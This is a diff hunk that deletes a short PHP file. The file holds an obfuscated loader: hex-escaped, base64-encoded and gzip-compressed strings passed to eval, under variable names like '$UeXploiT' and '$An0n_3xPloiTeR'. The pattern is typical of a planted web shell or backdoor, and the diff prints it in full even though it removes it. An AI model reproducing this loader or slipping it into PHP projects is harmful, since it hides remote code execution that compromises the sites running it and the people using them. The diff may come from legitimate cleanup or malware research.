@@ -1,6 +1,0 @@
-<?php
-$UeXploiT = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUHHMM8iLN64IyMnPDEkN0kQ\x431g\x41\x3d";
-$An0n_3xPloiTeR = "\x3d\x3d\x411\x2bTNs\x62\x62PMmD17vuY/mzroFwv9j2x\x42sxf4ph8ksvxZthPF\x42h\x41h6\x63eW\x62\x41\x41jv5\x62ev\x2byQp08kgs6fIV3Ri\x42Quj\x61\x43\x42GIOsW\x2butmFI\x63USoUq0iGDgVS\x42NENmQHqZ5Q\x62lxdt\x42k2P\x41v6o3Ms\x42On03klI9rFFG\x411J\x63tgK3/91Tu\x428Vd\x62\x63SVt2IrQl5mmIURUF\x61tH9/TTonnM4mH\x613/1U/MP8D32\x43v893ig1XsysV5eu1Pe5\x62S08THMTyJXf5\x2bslmjX4\x63fptr9\x43wdtSoN76EWdVM4O\x42qLtfneo\x2bzxkeg/Irtj9K\x63p24i/kHk7rsX\x2bKhLkVGyl8pYM9j\x43Tzr7DD8dU9g\x61vTeg/1vIQ/LXzwRS6EmnKItw9xR\x63U/7srpRSilD75OuzJJpVMuz\x62qjX8\x43HEMg\x42NJ3EzrT\x62KU48g70D\x435140z6\x633w\x2bF\x63\x63\x62Wj6z55q6l/2e\x43jDxTyK4\x63tS6L\x2bfTJEV\x61oVGO8r5jHYE\x42yROwfyS6IJRfhjR\x63qF0tM6L\x2bMgIY7qEwL\x613vzkZoSR\x43t\x41Xm\x2bjV3uP\x63Mm\x63qVzJqQEIG6W\x426\x41YX6\x62Dqo0\x61sD989Of/Kd4776jymD99f\x61T6VIHn\x42lOkN7RJ0KKtK\x63Z3kJQ\x41\x62EJW7JV\x42WyqEU1Iw6HxPyvG\x43\x42M\x61/WYRWm/1Egy\x42wJe\x2brS\x41VHg/lEg2\x42wJe\x2brR\x41lHg/VEg6\x42wJe\x2brQ\x411Hg/FEg\x2b\x42wJe";
-eval(htmlspecialchars_decode(gzinflate(base64_decode($UeXploiT))));
-exit;
-?>
